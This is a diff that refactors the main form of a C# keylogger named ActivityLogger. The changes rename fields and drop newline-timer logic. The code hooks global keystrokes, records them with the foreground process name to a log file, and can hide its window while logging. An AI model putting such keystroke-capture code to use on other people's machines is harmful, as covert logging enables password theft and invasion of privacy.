@@ -12,51 +12,47 @@ namespace ActivityLogger
 {
     public partial class FrmMain : Form
     {
-        private readonly Frmoptions _option;
-        private bool _allowtoTik;
-        private UserActivityHook _hooker;
-
-        private int _tik;
-        private bool _isLoggerOn;
-
-        private HtmlLogger _logger;
+        private readonly Frmoptions option;
+        private UserActivityHook hooker;
+        private bool loggerOn;
+        private HtmlLogger logger;
 
         public FrmMain()
         {
             InitializeComponent();
-            _option = new Frmoptions();
+            option = new Frmoptions();
         }
 
         private void ButtonStartClick(object sender, EventArgs e)
         {
-            if (!_hooker.IsActive)
+            if (!hooker.IsActive)
             {
-                _hooker.Start();
+                hooker.Start();
 
-                if (_isLoggerOn)
+                if (loggerOn)
                     timer_logsaver.Enabled = true;
             }
         }
 
         private void ButtonStopClick(object sender, EventArgs e)
         {
-            if (_hooker.IsActive)
+            if (hooker.IsActive)
             {
-                _hooker.Stop();
+                hooker.Stop();
                 timer_logsaver.Enabled = false;
             }
         }
 
         private void MainFormLoad(object sender, EventArgs e)
         {
-            _hooker = new UserActivityHook();
-            _hooker.KeyDown += HookerKeyDown;
-            _hooker.KeyPress += HookerKeyPress;
-            _hooker.KeyUp += HookerKeyUp;
-            _hooker.OnMouseActivity += HookerMouseActivity;
-            _hooker.Stop();
+            hooker = new UserActivityHook();
+            hooker.KeyDown += HookerKeyDown;
+            hooker.KeyPress += HookerKeyPress;
+            hooker.KeyUp += HookerKeyUp;
+            hooker.OnMouseActivity += HookerMouseActivity;
+            hooker.Stop();
 
-            _logger = new HtmlLogger();
+            logger = new HtmlLogger();
         }
 
         public void HookerMouseActivity(object sender, MouseEventArgs e){}
@@ -65,9 +61,7 @@ namespace ActivityLogger
 
         public void HookerKeyPress(object sender, KeyPressEventArgs e)
         {
-            _allowtoTik = true;
             Logger(FilterKeyChar(e.KeyChar));
-            _tik = 0;
         }
 
         public void HookerKeyUp(object sender, KeyEventArgs e){}
@@ -99,7 +93,7 @@ namespace ActivityLogger
             try
             {
                 Process p = Process.GetProcessById(APIs.GetWindowProcessID(APIs.getforegroundWindow()));
-                _logger.Log(p.ProcessName, txt);
+                logger.Log(p.ProcessName, txt);
             }
             catch (Exception ex)
             {
@@ -110,16 +104,6 @@ namespace ActivityLogger
 
         private void Timer1Tick(object sender, EventArgs e)
         {
-            if (_allowtoTik)
-            {
-                _tik += 1;
-
-                if (_tik != 20) return;
-                Logger(Environment.NewLine);
-                _tik = 0;
-                _allowtoTik = false;
-            }
-
             if (txt_CurrentWindowstitle.Text == Text)
                 txt_CurrentWindowstitle.Text = "Current Window Title";
         }
@@ -127,7 +111,7 @@ namespace ActivityLogger
         private void BtnHideClick(object sender, EventArgs e)
         {
             Hide();
-            _hooker.Start();
+            hooker.Start();
         }
 
         private void BtnExitClick(object sender, EventArgs e)
@@ -138,30 +122,30 @@ namespace ActivityLogger
         
         private void TimerLogsaverTick(object sender, EventArgs e)
         {
-            _logger.Save(_logger.LogFilePath);
+            logger.Save(logger.LogFilePath);
         }
 
         private void mnuItem_Settings_Click(object sender, EventArgs e)
         {
             // we don't want log our email password!
-            if (_hooker.IsActive)
-                _hooker.Stop();
+            if (hooker.IsActive)
+                hooker.Stop();
 
-            if (_option.ShowDialog() == DialogResult.OK)
+            if (option.ShowDialog() == DialogResult.OK)
             {
-                if (_option.chk_autosaver.Checked)
+                if (option.chk_autosaver.Checked)
                 {
-                    if (_option.txt_filelocation.Text.ToLower() != "Activitylog.xml".ToLower())
-                        _logger.LogFilePath = _option.txt_filelocation.Text;
+                    if (option.txt_filelocation.Text.ToLower() != "Activitylog.xml".ToLower())
+                        logger.LogFilePath = option.txt_filelocation.Text;
 
-                    timer_logsaver.Interval = (int) (_option.numeric_savetimer.Value*60000);
+                    timer_logsaver.Interval = (int) (option.numeric_savetimer.Value*60000);
                     timer_logsaver.Enabled = true;
-                    _isLoggerOn = true;
+                    loggerOn = true;
                 }
                 else
                 {
                     timer_logsaver.Enabled = false;
-                    _isLoggerOn = false;
+                    loggerOn = false;
                 }
             }
         }
@@ -183,7 +167,7 @@ namespace ActivityLogger
         private void MnuItemHideClick(object sender, EventArgs e)
         {
             Hide();
-            _hooker.Start();
+            hooker.Start();
         }
 
         private void MnuItemExitClick(object sender, EventArgs e)
@@ -201,7 +185,7 @@ namespace ActivityLogger
                             };
             if (savef.ShowDialog() == DialogResult.OK)
             {
-                _logger.Save(savef.FileName);
+                logger.Save(savef.FileName);
             }
         }
 
